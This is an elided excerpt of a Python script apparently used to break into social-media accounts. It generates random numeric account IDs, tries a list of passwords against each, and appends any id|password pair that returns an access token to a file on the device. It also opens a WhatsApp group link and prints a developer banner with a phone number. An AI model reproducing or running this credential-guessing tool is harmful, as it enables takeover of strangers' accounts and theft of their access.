...
class OLD_CLONER:
    ...
    #---jone 
    print ("D///E////V///1")
    os.system(" xdg-open https://chat.whatsapp.com/devikinge")
    def banner(self):
        os.system("clear")
        print("DEVELOPER  : DEVI ")
        print("GITHUB     : Devixayyat")
        print("WHATSAPP :03263342276")
    ...
    def oldClone(self,series):
        ...
        for a in range(limit):
            DEVI = "".join(random.choice(string.digits) for _ in range(self.uG))
            self.gen.append(DEVI)
    ...
    def CloneOld(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\x1b[mDEVI-XD {self.loop}|OLD|OK:{len(self.oks)}|CP:{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
                ...
                if "access_token" in response:
                    ...
                    open("/sdcard/DEVI-OLD-CP.txt","a").write(ids+"|"+pas+"\n")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
